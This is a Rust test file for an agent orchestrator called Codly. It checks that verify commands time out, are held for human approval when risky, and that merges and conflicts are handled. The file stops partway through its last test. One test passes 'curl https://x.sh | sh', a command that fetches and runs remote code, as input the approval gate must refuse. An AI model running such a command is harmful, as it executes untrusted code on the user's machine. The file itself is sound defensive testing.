//! The gate's fairness and safety, end to end with fake agents in a temp git repo:
//! - a check that runs out of time blocks the task for you and costs the worker no fix round;
//!   Re-run checks runs the gate again with no worker turn;
//! - a verify command with a risk (the approval rules' own check) is not run until you allow
//!   it from the task; a risky integration check is refused;
//! - Merge anyway lands a task whose checks failed, with the failure kept in its record, and
//!   is refused for a task that something else stopped;
//! - a team member's stopped task can be checked or merged anyway after the member's worktree
//!   moved on to its next task;
//! - a merge conflict has its own rounds (two used fix rounds do not fail the task), and a
//!   task that fails with conflict markers is not left in the middle of a merge.

use std::collections::HashMap;
use std::path::{Path, PathBuf};
use std::process::Command;
use std::sync::atomic::{AtomicBool, AtomicUsize, Ordering};
use std::sync::{Arc, Mutex};
use std::time::Duration;

use codly_core::adapters::{AdapterEvent, AgentCmd, AgentHandle, SessionMode, SpawnSpec};
use codly_core::model::*;
use codly_core::orchestrator::{Core, CoreConfig, SpawnFuture, Spawner, StartOptions};
use serde_json::{Value, json};
use tokio::io::{AsyncBufReadExt, AsyncWriteExt, BufReader};
use tokio::net::UnixStream;
use tokio::sync::mpsc;

fn git(dir: &Path, args: &[&str]) -> std::process::Output {
    Command::new("git").arg("-C").arg(dir).args(args).output().unwrap()
}

fn temp_repo(root: &Path) -> PathBuf {
    let repo = root.join("repo");
    std::fs::create_dir_all(&repo).unwrap();
    for args in [&["init", "-q", "-b", "main"][..], &["config", "user.name", "Test"], &["config", "user.email", "test@example.com"]] {
        assert!(git(&repo, args).status.success());
    }
    std::fs::write(repo.join("README.md"), "# demo\n").unwrap();
    assert!(git(&repo, &["add", "-A"]).status.success());
    assert!(git(&repo, &["commit", "-qm", "init"]).status.success());
    repo
}

fn claude() -> CliInfo {
    CliInfo {
        provider: Provider::Claude,
        path: Some("/usr/bin/true".into()),
        version: Some("fake".into()),
        logged_in: Some(true),
        billing: Billing::Subscription,
        plan: None,
        problem: None,
        transport: "fake".into(),
        install: codly_core::env::install_hint(Provider::Claude),
        default_model: None,
    }
}

#[derive(Clone)]
struct FakeTurn {
    spec: Arc<SpawnSpec>,
    prompt: String,
    events: mpsc::UnboundedSender<AdapterEvent>,
}

impl FakeTurn {
    fn say(&self, text: &str) {
        let kind = EventKind::Message { item_id: new_id(), text: text.into(), phase: MessagePhase::Final };
        let _ = self.events.send(AdapterEvent { agent_id: self.spec.agent_id.clone(), run_id: self.spec.run_id.clone(), kind });
    }

    /// Call a codly_* tool exactly like the stdio bridge does.
    async fn tool(&self, name: &str, args: Value) -> Value {
        let mcp = self.spec.mcp.as_ref().expect("Codly gives every agent its MCP server");
        let env = |k: &str| mcp.env.iter().find(|(n, _)| n == k).map(|(_, v)| v.clone()).unwrap();
        let mut s = UnixStream::connect(env("CODLY_MCP_SOCK")).await.unwrap();
        let req = json!({ "token": env("CODLY_MCP_TOKEN"), "tool": name, "args": args });
        s.write_all(format!("{req}\n").as_bytes()).await.unwrap();
        let mut lines = BufReader::new(s).lines();
        serde_json::from_str(&lines.next_line().await.unwrap().unwrap()).unwrap()
    }

    fn write(&self, rel: &str, content: &str) {
        std::fs::write(self.spec.cwd.join(rel), content).unwrap();
    }

    /// The worker's report; shared.txt is the one file these tests write outside a scope.
    async fn done(&self) {
        let report = json!({ "status": "done", "summary": "Did it.", "scope_exceptions": ["shared.txt: both tasks need it"] });
        self.tool("codly_submit_report", report).await;
    }
}

type Behavior = Arc<dyn Fn(FakeTurn) -> std::pin::Pin<Box<dyn std::future::Future<Output = ()> + Send>> + Send + Sync>;
/// (role, agent id, prompt) of every turn.
type Turns = Arc<Mutex<Vec<(Role, String, String)>>>;

struct FakeSpawner {
    lead: Behavior,
    worker: Behavior,
    turns: Turns,
}

impl Spawner for FakeSpawner {
    fn spawn(&self, spec: SpawnSpec, events: mpsc::UnboundedSender<AdapterEvent>) -> SpawnFuture {
        let behavior = if spec.role == Role::Lead { self.lead.clone() } else { self.worker.clone() };
        let turns = self.turns.clone();
        Box::pin(async move {
            let session = match &spec.session {
                SessionMode::New { session_id } => session_id.clone().unwrap_or_else(|| format!("fake-{}", spec.run_id)),
                SessionMode::Resume { session_id } => session_id.clone(),
            };
            let (tx, mut rx) = mpsc::unbounded_channel::<AgentCmd>();
            let spec = Arc::new(spec);
            let send = {
                let (events, spec) = (events.clone(), spec.clone());
                move |kind| {
                    let _ = events.send(AdapterEvent { agent_id: spec.agent_id.clone(), run_id: spec.run_id.clone(), kind });
                }
            };
            send(EventKind::SessionStarted {
                provider: spec.provider,
                model: Some("fake-model".into()),
                cwd: spec.cwd.to_string_lossy().into_owned(),
                cli_version: None,
                session_id: Some(session),
                billing: Billing::Subscription,
                tools: vec![],
            });
            let spec2 = spec.clone();
            tokio::spawn(async move {
                while let Some(cmd) = rx.recv().await {
                    match cmd {
                        AgentCmd::Prompt(text) => {
                            turns.lock().unwrap().push((spec2.role, spec2.agent_id.clone(), text.clone()));
                            send(EventKind::TurnStarted { input: Some(text.clone()) });
                            send(EventKind::StatusChanged { status: AgentStatus::Thinking });
                            behavior(FakeTurn { spec: spec2.clone(), prompt: text, events: events.clone() }).await;
                            send(EventKind::TurnCompleted { status: TurnStatus::Completed, result_text: None, duration_ms: Some(5) });
                            send(EventKind::StatusChanged { status: AgentStatus::Idle });
                        }
                        AgentCmd::Shutdown => {
                            send(EventKind::Exited { code: Some(0) });
                            break;
                        }
                        AgentCmd::Interrupt | AgentCmd::Approval { .. } => {}
                    }
                }
            });
            Ok(AgentHandle { agent_id: spec.agent_id.clone(), run_id: spec.run_id.clone(), tx })
        })
    }
}

fn task(id: &str, file: &str, verify: &str) -> Value {
    json!({
        "id": id, "title": format!("Create {file}"), "goal": format!("Create {file}"), "consultant": { "title": "Backend" },
        "acceptance_criteria": [format!("{file} is right")], "write_scope": [file], "depends_on": [], "verify": [verify], "size": "M",
    })
}

/// A Lead that submits this plan for every request.
fn lead_with(plan: Value) -> Behavior {
    Arc::new(move |turn: FakeTurn| {
        let plan = plan.clone();
        Box::pin(async move {
            if turn.prompt.contains("[Codly]") {
                turn.say("Noted.");
                return;
            }
            let reply = turn.tool("codly_submit_plan", plan).await;
            assert_eq!(reply["ok"], true, "{reply}");
            turn.say("Planned.");
        })
    })
}

/// A worker that writes hello.txt on every turn.
fn hello_worker() -> Behavior {
    Arc::new(|turn: FakeTurn| {
        Box::pin(async move {
            turn.write("hello.txt", "hello\n");
            turn.done().await;
        })
    })
}

/// A core with one open repo, where a request runs its plan at once.
async fn start(root: &Path, spawner: FakeSpawner, settings: Settings) -> Arc<Core> {
    let repo = temp_repo(root);
    let cfg = CoreConfig { data_dir: root.join("data"), app_exe: PathBuf::from("/usr/bin/true") };
    let opts = StartOptions { spawner: Some(Arc::new(spawner)), env: Some(std::env::vars().collect()), clis: Some(vec![claude()]), index: false };
    let core = Core::start_with(cfg, opts).await.unwrap();
    core.update_settings(settings).await.unwrap();
    core.open_workspace(repo.to_str().unwrap()).await.unwrap();
    core.send_chat("lead", "Please do it").await.unwrap();
    core
}

fn auto() -> Settings {
    Settings { auto_run_plans: true, lead_followups: false, ..Default::default() }
}

async fn wait_for<T>(what: &str, secs: u64, mut f: impl AsyncFnMut() -> Option<T>) -> T {
    let deadline = tokio::time::Instant::now() + Duration::from_secs(secs);
    loop {
        if let Some(v) = f().await {
            return v;
        }
        assert!(tokio::time::Instant::now() < deadline, "timed out waiting for {what}");
        tokio::time::sleep(Duration::from_millis(50)).await;
    }
}

async fn task_by_key(core: &Core, key: &str) -> Option<Task> {
    core.snapshot().await.unwrap().tasks.into_iter().find(|t| t.key == key)
}

async fn wait_task(core: &Core, key: &str, status: TaskStatus) -> Task {
    wait_for(&format!("{key} to be {status:?}"), 40, async || task_by_key(core, key).await.filter(|t| t.status == status)).await
}

async fn wait_plan(core: &Core, status: PlanStatus) {
    wait_for(&format!("the plan to be {status:?}"), 40, async || {
        core.snapshot().await.unwrap().plans.first().is_some_and(|p| p.status == status).then_some(())
    })
    .await
}

/// Every event of the office, oldest first.
async fn events(core: &Core) -> Vec<EventRow> {
    let mut all = core.events(None, None, 4000).await.unwrap();
    all.sort_by_key(|e| e.id);
    all
}

/// Codly's verify runs, oldest first: (command, passed).
fn verified(events: &[EventRow]) -> Vec<(String, bool)> {
    events
        .iter()
        .filter_map(|e| match &e.kind {
            EventKind::Verified { command, ok, .. } => Some((command.clone(), *ok)),
            _ => None,
        })
        .collect()
}

/// (method, summary, detail) of every decision, oldest first.
fn decisions(events: &[EventRow]) -> Vec<(String, String, Value)> {
    events
        .iter()
        .filter_map(|e| match &e.kind {
            EventKind::Decision { method, summary, detail, .. } => Some((method.clone(), summary.clone(), detail.clone())),
            _ => None,
        })
        .collect()
}

fn worker_prompts(turns: &Turns) -> Vec<String> {
    turns.lock().unwrap().iter().filter(|t| t.0 == Role::Worker).map(|t| t.2.clone()).collect()
}

#[tokio::test(flavor = "multi_thread", worker_threads = 4)]
async fn a_check_that_runs_out_of_time_blocks_the_task_and_costs_no_fix_round() {
    let dir = tempfile::tempdir().unwrap();
    let turns = Turns::default();
    let plan = json!({ "summary": "Add a hello file", "tasks": [task("t1", "hello.txt", "sleep 3 && grep -q hello hello.txt")] });
    let spawner = FakeSpawner { lead: lead_with(plan), worker: hello_worker(), turns: turns.clone() };
    let core = start(dir.path(), spawner, Settings { verify_timeout_secs: 1, ..auto() }).await;

    let t = wait_task(&core, "t1", TaskStatus::Blocked).await;
    let reason = t.status_reason.clone().unwrap();
    assert!(reason.contains("did not finish in 1 s") && reason.contains("time limit for checks") && reason.contains("merge anyway"), "{reason}");
    let before = events(&core).await;
    assert_eq!(verified(&before), [("sleep 3 && grep -q hello hello.txt".to_string(), false)]);
    assert!(!decisions(&before).iter().any(|d| d.1.contains("fix round")), "a timeout is not the worker's to fix");
    assert_eq!(worker_prompts(&turns).len(), 1, "the worker is not asked to fix a timeout");

    // You raise the limit and re-run the checks: no worker turn, and the task lands.
    core.update_settings(Settings { verify_timeout_secs: 60, ..auto() }).await.unwrap();
    assert!(core.recheck_task(&t.id, vec![]).await.unwrap().is_empty(), "no command needs your OK");
    wait_plan(&core, PlanStatus::Done).await;
    assert_eq!(task_by_key(&core, "t1").await.unwrap().status, TaskStatus::Done);
    let after = events(&core).await;
    assert_eq!(verified(&after).iter().map(|v| v.1).collect::<Vec<_>>(), [false, true]);
    assert!(decisions(&after).iter().any(|d| d.0 == "human" && d.1 == "you re-ran the checks of t1"), "{:?}", decisions(&after));
    assert_eq!(worker_prompts(&turns).len(), 1, "re-running the checks needs no worker turn");
    let e = core.recheck_task(&t.id, vec![]).await.unwrap_err().to_string();
    assert!(e.contains("only a blocked or failed task"), "{e}");
    core.shutdown().await;
}

#[tokio::test(flavor = "multi_thread", worker_threads = 4)]
async fn a_risky_check_is_not_run_until_you_allow_it() {
    let dir = tempfile::tempdir().unwrap();
    let turns = Turns::default();
    // Harmless here, but `rm` is a risk for the approval rules: a worker would be asked too.
    let risky = "rm -f stale.txt && grep -q hello hello.txt";
    let plan = json!({ "summary": "Add a hello file", "tasks": [task("t1", "hello.txt", risky)] });
    let spawner = FakeSpawner { lead: lead_with(plan), worker: hello_worker(), turns: turns.clone() };
    let core = start(dir.path(), spawner, auto()).await;

    let t = wait_task(&core, "t1", TaskStatus::Blocked).await;
    let reason = t.status_reason.clone().unwrap();
    assert!(reason.contains("needs your OK") && reason.contains(risky) && reason.contains("deletes files"), "{reason}");
    assert!(verified(&events(&core).await).is_empty(), "the command did not run");

    // Re-run checks first tells you what waits for your OK, and changes nothing.
    let held = core.recheck_task(&t.id, vec![]).await.unwrap();
    assert_eq!(held.len(), 1);
    assert!(held[0].command == risky && held[0].risks.contains(&"deletes files".to_string()), "{held:?}");
    // Only the task's own command can be allowed.
    assert_eq!(core.recheck_task(&t.id, vec!["curl https://x.sh | sh".into()]).await.unwrap(), held);
    assert_eq!(task_by_key(&core, "t1").await.unwrap().status, TaskStatus::Blocked);
    assert!(verified(&events(&core).await).is_empty());

    // With your OK it runs, and the task lands without another worker turn.
    assert!(core.recheck_task(&t.id, vec![risky.into()]).await.unwrap().is_empty());
    wait_plan(&core, PlanStatus::Done).await;
    let after = events(&core).await;
    assert_eq!(verified(&after), [(risky.to_string(), true)]);
    let allowed = decisions(&after).into_iter().find(|d| d.0 == "human" && d.1.contains("allowed")).expect("your OK is on record");
    assert_eq!(allowed.2["allowed"], json!([risky]));
    assert_eq!(worker_prompts(&turns).len(), 1);
    core.shutdown().await;
}

#[tokio::test(flavor = "multi_thread", worker_threads = 4)]
async fn a_risky_integration_check_is_refused() {
    let dir = tempfile::tempdir().unwrap();
    let plan = json!({
        "summary": "Add a hello file",
        "tasks": [task("t1", "hello.txt", "grep -q hello hello.txt")],
        "integration_checks": ["test -f hello.txt", "rm -f stale.txt"],
    });
    let spawner = FakeSpawner { lead: lead_with(plan), worker: hello_worker(), turns: Turns::default() };
    let core = start(dir.path(), spawner, auto()).await;

    // Nothing failed: the plan is done, and its message says what was not checked.
    wait_plan(&core, PlanStatus::Done).await;
    let all = events(&core).await;
    let checks: Vec<(String, bool, String)> = all
        .iter()
        .filter_map(|e| match &e.kind {
            EventKind::Verified { command, ok, tail, .. } if e.task_id.is_none() => Some((command.clone(), *ok, tail.clone())),
            _ => None,
        })
        .collect();
    assert_eq!(checks.len(), 2, "{checks:?}");
    assert!(checks[0].1, "the safe check ran: {checks:?}");
    assert!(!checks[1].1 && checks[1].2.contains("not run") && checks[1].2.contains("deletes files"), "{checks:?}");
    let snap = core.snapshot().await.unwrap();
    let report = snap.chats.iter().find(|c| c.author == "codly" && c.text.contains("finished"));
    let said = report.map(|c| c.text.clone()).expect("Codly reports the plan");
    assert!(said.contains("Codly did not run 1 integration check: it needs your OK first. `rm -f stale.txt` (deletes files)."), "{said}");
    let integration = snap.plans[0].integration_worktree.clone().unwrap();
    assert!(said.contains(&format!("Run it yourself in {integration}")) && said.contains("then merge it into main"), "{said}");
    assert!(!said.contains("failed") && !said.contains("fix plan"), "a check that did not run did not fail: {said}");
    let merge = decisions(&all).into_iter().rfind(|d| !d.2["refused_checks"].is_null()).expect("the decision keeps the refused check");
    assert_eq!(merge.2["refused_checks"], json!([{ "command": "rm -f stale.txt", "risks": ["deletes files"] }]));
    assert_eq!(merge.2["failed_checks"], json!([]));
    core.shutdown().await;
}

#[tokio::test(flavor = "multi_thread", worker_threads = 4)]
async fn merge_anyway_lands_a_task_whose_checks_failed() {
    let dir = tempfile::tempdir().unwrap();
    let turns = Turns::default();
    let failing = "grep -q nope hello.txt";
    let plan = json!({ "summary": "Add a hello file", "tasks": [task("t1", "hello.txt", failing)] });
    let spawner = FakeSpawner { lead: lead_with(plan), worker: hello_worker(), turns: turns.clone() };
    let core = start(dir.path(), spawner, auto()).await;

    let t = wait_task(&core, "t1", TaskStatus::Failed).await;
    assert!(t.status_reason.as_deref().is_some_and(|r| r.contains("after 2 fix rounds")), "{:?}", t.status_reason);
    assert_eq!(worker_prompts(&turns).len(), 3, "the brief and two fix rounds");

    let accepted = core.accept_task(&t.id).await.unwrap();
    assert_eq!(accepted.status, TaskStatus::Verifying);
    wait_plan(&core, PlanStatus::Done).await;
    assert_eq!(task_by_key(&core, "t1").await.unwrap().status, TaskStatus::Done);
    let all = events(&core).await;
    // The failures stay in the record, and the checks were not run again.
    assert_eq!(verified(&all), vec![(failing.to_string(), false); 3]);
    let yours = decisions(&all).into_iter().find(|d| d.0 == "human" && d.1.contains("merge t1 anyway")).expect("your decision is on record");
    assert!(yours.1.contains(failing), "{}", yours.1);
    assert_eq!(yours.2["last_failed"]["command"], failing);
    assert_eq!(yours.2["last_failed"]["exit_code"], 1);
    assert!(decisions(&all).iter().any(|d| d.1 == "t1: checks not run, you chose to merge anyway"));
    assert!(all.iter().any(|e| matches!(e.kind, EventKind::Merged { .. })));
    assert_eq!(worker_prompts(&turns).len(), 3, "merging anyway needs no worker turn");
    let e = core.accept_task(&t.id).await.unwrap_err().to_string();
    assert!(e.contains("can be merged anyway"), "{e}");
    core.shutdown().await;
}

#[tokio::test(flavor = "multi_thread", worker_threads = 4)]
async fn merge_anyway_is_only_for_a_task_its_checks_stopped() {
    let dir = tempfile::tempdir().unwrap();
    let turns = Turns::default();
    // The checks pass; the worker keeps writing a file outside its scope.
    let worker: Behavior = Arc::new(|turn: FakeTurn| {
        Box::pin(async move {
            turn.write("hello.txt", "hello\n");
            turn.write("other.txt", "not mine\n");
            turn.done().await;
        })
    });
    let plan = json!({ "summary": "Add a hello file", "tasks": [task("t1", "hello.txt", "grep -q hello hello.txt")] });
    let core = start(dir.path(), FakeSpawner { lead: lead_with(plan), worker, turns: turns.clone() }, auto()).await;

    let t = wait_task(&core, "t1", TaskStatus::Failed).await;
    assert!(t.status_reason.as_deref().is_some_and(|r| r.contains("outside the write scope after 2 fix rounds")), "{:?}", t.status_reason);
    let e = core.accept_task(&t.id).await.unwrap_err().to_string();
    assert!(e.contains("was not stopped by its checks") && e.contains("Retry"), "{e}");
    // Nothing moved: no new pass, no worker turn, checks still on.
    let after = task_by_key(&core, "t1").await.unwrap();
    assert_eq!((after.status, &after.status_reason), (TaskStatus::Failed, &t.status_reason));
    assert_eq!(worker_prompts(&turns).len(), 3, "the brief and two fix rounds");
    assert!(!decisions(&events(&core).await).iter().any(|d| d.1.contains("anyway")), "no choice of yours is on record");
    core.shutdown().await;
}

/// A plan of two tasks for the team member Ana: t1 has a verify command with a risk (it is
/// held), t2 a safe one. Ana works in one worktree, so t2 takes it over once t1 is stopped.
/// Ana's turn on t2 ends when `go` says so.
async fn member_tasks(root: &Path, go: Arc<tokio::sync::Notify>) -> (Arc<Core>, Turns) {
    let turns = Turns::default();
    let mut tasks = vec![task("t1", "t1.txt", RISKY), task("t2", "t2.txt", "test -f t2.txt")];
    for t in &mut tasks {
        // Ana's, not a consultant's.
        t.as_object_mut().unwrap().remove("consultant");
        t["assignee"] = json!("Ana");
    }
    let plan = json!({ "summary": "Add files", "tasks": tasks });
    let worker: Behavior = Arc::new(move |turn: FakeTurn| {
        let go = go.clone();
        Box::pin(async move {
            // A brief names its task; back on a task (a retry), its file is already there.
            if let Some(key) = turn.prompt.split(BRIEF).nth(1).and_then(|s| s.split(':').next()) {
                if key == "t2" {
                    go.notified().await;
                }
                turn.write(&format!("{key}.txt"), "x\n");
            }
            turn.done().await;
        })
    });
    let ana = TeamMember { name: "Ana".into(), role: "Backend dev".into(), ..Default::default() };
    let core = start(root, FakeSpawner { lead: lead_with(plan), worker, turns: turns.clone() }, Settings { team: vec![ana], ..auto() }).await;
    (core, turns)
}

/// Harmless here, but `rm` is a risk for the approval rules.
const RISKY: &str = "rm -f stale.txt && test -f t1.txt";

fn branch_of(worktree: &Path) -> String {
    String::from_utf8(git(worktree, &["rev-parse", "--abbrev-ref", "HEAD"]).stdout).unwrap().trim().to_string()
}

#[tokio::test(flavor = "multi_thread", worker_threads = 4)]
async fn a_members_stopped_task_is_checked_after_its_worktree_moved_on() {
    let dir = tempfile::tempdir().unwrap();
    let go = Arc::new(tokio::sync::Notify::new());
    go.notify_one(); // t2 runs straight through
    let (core, turns) = member_tasks(dir.path(), go).await;

    let t1 = wait_task(&core, "t1", TaskStatus::Blocked).await;
    assert!(t1.status_reason.as_deref().is_some_and(|r| r.contains("needs your OK")), "{:?}", t1.status_reason);
    // Ana did t2 meanwhile, in the same worktree, and is free again.
    let t2 = wait_task(&core, "t2", TaskStatus::Done).await;
    let ana = t1.assignee.clone().unwrap();
    let free = async || core.snapshot().await.unwrap().agents.iter().any(|a| a.id == ana && a.run_id.is_none()).then_some(());
    wait_for("Ana to be free", 20, free).await;
    let wt = PathBuf::from(t1.worktree.clone().unwrap());
    assert_eq!(t2.worktree, t1.worktree, "a member has one worktree");
    assert_eq!(Some(branch_of(&wt)), t2.branch, "the worktree is on t2's branch");

    // Re-run checks still says what waits for your OK.
    let held = core.recheck_task(&t1.id, vec![]).await.unwrap();
    assert!(held.len() == 1 && held[0].command == RISKY, "{held:?}");
    // With your OK, Codly brings the worktree back to t1 and checks it, with no worker turn.
    assert!(core.recheck_task(&t1.id, vec![RISKY.into()]).await.unwrap().is_empty());
    wait_plan(&core, PlanStatus::Done).await;
    assert_eq!(task_by_key(&core, "t1").await.unwrap().status, TaskStatus::Done);
    // The check passed, and t1.txt is only on t1's branch: the worktree was back on it.
    let all = events(&core).await;
    assert!(verified(&all).contains(&(RISKY.to_string(), true)), "{:?}", verified(&all));
    assert_eq!(worker_prompts(&turns).len(), 2, "one brief per task, and no turn for the re-run");
    core.shutdown().await;
}

#[tokio::test(flavor = "multi_thread", worker_threads = 4)]
async fn a_members_stopped_task_waits_for_the_member_and_keeps_your_choice() {
    let dir = tempfile::tempdir().unwrap();
    let go = Arc::new(tokio::sync::Notify::new());
    let (core, turns) = member_tasks(dir.path(), go.clone()).await;

    let t1 = wait_task(&core, "t1", TaskStatus::Blocked).await;
    // Ana is in her turn on t2, in the worktree t1 shares.
    wait_for("Ana to start t2", 20, async || (worker_prompts(&turns).len() == 2).then_some(())).await;

    // Merge anyway cannot have the worktree now: t1 goes back in line for Ana.
    let queued = core.accept_task(&t1.id).await.unwrap();
    assert_eq!(queued.status, TaskStatus::Ready);
    assert!(queued.status_reason.as_deref().is_some_and(|r| r.contains("Ana is on other work")), "{:?}", queued.status_reason);
    let said = decisions(&events(&core).await);
    let yours = said.into_iter().find(|d| d.0 == "human" && d.1.contains("merge t1 anyway")).expect("your decision is on record");
    assert!(yours.1.contains("goes back to Ana first") && yours.2["waits_for"] == "Ana", "{yours:?}");
    assert_eq!(task_by_key(&core, "t2").await.unwrap().status, TaskStatus::Running, "Ana's turn on t2 goes on");

    // Ana finishes t2, then takes t1 again: the gate after that turn uses your choice.
    go.notify_one();
    wait_plan(&core, PlanStatus::Done).await;
    assert_eq!(task_by_key(&core, "t1").await.unwrap().status, TaskStatus::Done);
    let all = events(&core).await;
    assert!(!verified(&all).iter().any(|v| v.0 == RISKY), "the check you skipped never ran: {:?}", verified(&all));
    assert!(decisions(&all).iter().any(|d| d.1 == "t1: checks not run, you chose to merge anyway"));
    let prompts = worker_prompts(&turns);
    assert!(prompts.len() == 3 && prompts[2].contains("You are back on task t1"), "{prompts:?}");
    core.shutdown().await;
}

/// What t2's worker does on a turn, given its prompt: the task it waits to see merged first
/// (the test fixes the order of the merges that way), then the files it writes.
type Script = fn(&str) -> (Option<&'static str>, Vec<(&'static str, &'static str)>);

/// How a worker's task brief starts (its other prompts from Codly are feedback).
const BRIEF: &str = "[Codly] Task ";
const CONFLICT: &str = "Your branch conflicts";

/// Wait, 30 s at most, for something another task does.
async fn until(there: impl Fn() -> bool) {
    for _ in 0..1500 {
        if there() {
            return;
        }
        tokio::time::sleep(Duration::from_millis(20)).await;
    }
    panic!("the other task did not get there");
}

/// Tasks that all write shared.txt (a declared scope exception) next to their own file. t1
/// and t2 start side by side and t1 merges first, so t2 conflicts with it at its merge.
/// The `later` tasks run one after the other behind t1; each one changes shared.txt again
/// once t2 was told of one more conflict, so t2 conflicts again.
async fn conflicting_tasks(root: &Path, later: &'static [&'static str], t2: Script) -> (Arc<Core>, Turns) {
    let turns = Turns::default();
    let mut tasks = vec![task("t1", "t1.txt", "test -f t1.txt"), task("t2", "t2.txt", "grep -q ok t2.txt")];
    let mut before = "t1";
    for &key in later {
        let mut t = task(key, &format!("{key}.txt"), &format!("test -f {key}.txt"));
        t["depends_on"] = json!([before]);
        tasks.push(t);
        before = key;
    }
    let plan = json!({ "summary": "Add files", "tasks": tasks });
    // t1 waits until t2 has its worktree: cut before t1's merge.
    let t2_up = Arc::new(AtomicBool::new(false));
    // Conflicts t2 was told of.
    let conflicts = Arc::new(AtomicUsize::new(0));
    let merged: Arc<Mutex<Vec<String>>> = Arc::default();
    // An agent's task: its last brief names it.
    let keys: Arc<Mutex<HashMap<String, String>>> = Arc::default();
    let worker: Behavior = {
        let merged = merged.clone();
        Arc::new(move |turn: FakeTurn| {
            let (t2_up, conflicts, merged, keys) = (t2_up.clone(), conflicts.clone(), merged.clone(), keys.clone());
            Box::pin(async move {
                let key = {
                    let mut keys = keys.lock().unwrap();
                    if let Some(key) = turn.prompt.split(BRIEF).nth(1).and_then(|s| s.split(':').next()) {
                        keys.insert(turn.spec.agent_id.clone(), key.to_string());
                    }
                    keys.get(&turn.spec.agent_id).cloned().expect("a task brief comes first")
                };
                if key == "t2" {
                    t2_up.store(true, Ordering::SeqCst);
                    if turn.prompt.contains(CONFLICT) {
                        conflicts.fetch_add(1, Ordering::SeqCst);
                    }
                    let (after, files) = t2(&turn.prompt);
                    if let Some(other) = after {
                        until(|| merged.lock().unwrap().iter().any(|k| k == other)).await;
                    }
                    for (file, content) in files {
                        turn.write(file, content);
                    }
                } else {
                    let turn_of = later.iter().position(|k| *k == key).map_or(0, |i| i + 1);
                    until(|| t2_up.load(Ordering::SeqCst) && conflicts.load(Ordering::SeqCst) >= turn_of).await;
                    turn.write(&format!("{key}.txt"), "x\n");
                    turn.write("shared.txt", &format!("from {key}\n"));
                }
                turn.done().await;
            })
        })
    };
    let core = start(root, FakeSpawner { lead: lead_with(plan), worker, turns: turns.clone() }, auto()).await;
    // The workers cannot see the board: tell them which tasks are merged.
    let board = core.clone();
    tokio::spawn(async move {
        while let Ok(s) = board.snapshot().await {
            *merged.lock().unwrap() = s.tasks.into_iter().filter(|t| t.status == TaskStatus::Done).map(|t| t.key).collect();
            tokio::time::sleep(Duration::from_millis(30)).await;
        }
    });
    (core, turns)
}

fn in_merge(worktree: &Path) -> bool {
    git(worktree, &["rev-parse", "-q", "--verify", "MERGE_HEAD"]).status.success()
}

#[tokio::test(flavor = "multi_thread", worker_threads = 4)]
async fn a_conflict_after_two_fix_rounds_still_goes_to_the_worker() {
    let dir = tempfile::tempdir().unwrap();
    // Two verify failures use both fix rounds; then the merge conflicts with t1's shared.txt.
    let t2: Script = |prompt| {
        if prompt.contains(CONFLICT) {
            (None, vec![("shared.txt", "from t1 and t2\n")])
        } else if prompt.contains("fix round 2/2") {
            (None, vec![("t2.txt", "ok\n")])
        } else if prompt.contains("fix round 1/2") {
            (None, vec![("t2.txt", "not yet\n")])
        } else {
            (Some("t1"), vec![("t2.txt", "no\n"), ("shared.txt", "from t2\n")])
        }
    };
    let (core, turns) = conflicting_tasks(dir.path(), &[], t2).await;

    wait_plan(&core, PlanStatus::Done).await;
    assert_eq!(task_by_key(&core, "t2").await.unwrap().status, TaskStatus::Done);
    let all = events(&core).await;
    let said = decisions(&all);
    assert!(said.iter().any(|d| d.1.contains("fix round 2/2")), "both fix rounds were used");
    assert!(said.iter().any(|d| d.1.starts_with("t2: conflict round 1/3: merge conflict in shared.txt")), "{said:?}");
    assert!(!said.iter().any(|d| d.1.contains("failed:")), "a conflict does not cost a fix round: {said:?}");
    let conflict = worker_prompts(&turns).into_iter().find(|p| p.contains(CONFLICT)).expect("the worker is asked to resolve it");
    assert!(conflict.contains("(round 1/3)") && conflict.contains("shared.txt"), "{conflict}");
    core.shutdown().await;
}

#[tokio::test(flavor = "multi_thread", worker_threads = 4)]
async fn a_task_that_fails_with_markers_is_not_left_mid_merge() {
    let dir = tempfile::tempdir().unwrap();
    // The worker never resolves the conflict: its markers stay until the fix rounds run out.
    let t2: Script = |prompt| match prompt.contains(BRIEF) {
        true => (Some("t1"), vec![("t2.txt", "ok\n"), ("shared.txt", "from t2\n")]),
        false => (None, vec![]),
    };
    let (core, _turns) = conflicting_tasks(dir.path(), &[], t2).await;

    let t = wait_task(&core, "t2", TaskStatus::Failed).await;
    let reason = t.status_reason.clone().unwrap();
    assert!(reason.contains("conflict markers left in shared.txt after 2 fix rounds"), "{reason}");
    let wt = PathBuf::from(t.worktree.clone().unwrap());
    assert!(!in_merge(&wt), "the merge was undone");
    assert_eq!(std::fs::read_to_string(wt.join("shared.txt")).unwrap(), "from t2\n", "no markers are left");
    let all = events(&core).await;
    let said = decisions(&all);
    assert!(said.iter().any(|d| d.1.starts_with("t2: conflict round 1/3")), "{said:?}");
    assert!(said.iter().any(|d| d.1.contains("after 2 fix rounds") && d.2["merge_aborted"] == true), "{said:?}");
    core.shutdown().await;
}

#[tokio::test(flavor = "multi_thread", worker_threads = 4)]
async fn a_task_out_of_conflict_rounds_waits_for_you_with_no_merge_started() {
    let dir = tempfile::tempdir().unwrap();
    // Each time t2 is told of a conflict, another task lands on shared.txt before t2 has
    // resolved it: t3 in round 1, t4 in round 2, t5 in round 3. So t2 conflicts four times.
    let t2: Script = |prompt| {
        if prompt.contains("(round 1/3)") {
            (Some("t3"), vec![("shared.txt", "resolved by t2\n")])
        } else if prompt.contains("(round 2/3)") {
            (Some("t4"), vec![("shared.txt", "resolved by t2\n")])
        } else if prompt.contains("(round 3/3)") {
            (Some("t5"), vec![("shared.txt", "resolved by t2\n")])
        } else if prompt.contains(BRIEF) {
            (Some("t1"), vec![("t2.txt", "ok\n"), ("shared.txt", "from t2\n")])
        } else {
            (None, vec![]) // back on the task after your Retry: nothing to change
        }
    };
    let (core, turns) = conflicting_tasks(dir.path(), &["t3", "t4", "t5"], t2).await;
    let asked = || worker_prompts(&turns).into_iter().filter(|p| p.contains(CONFLICT)).count();

    let t = wait_task(&core, "t2", TaskStatus::Blocked).await;
    let reason = t.status_reason.clone().unwrap();
    assert!(reason.contains("still conflicts with") && reason.contains("shared.txt") && reason.contains("after 3 conflict rounds"), "{reason}");
    assert_eq!(asked(), 3, "the worker got its three conflict rounds");
    // The fourth merge was not started: the worktree is as the worker left it.
    let wt = PathBuf::from(t.worktree.clone().unwrap());
    assert!(!in_merge(&wt));
    assert_eq!(std::fs::read_to_string(wt.join("shared.txt")).unwrap(), "resolved by t2\n");
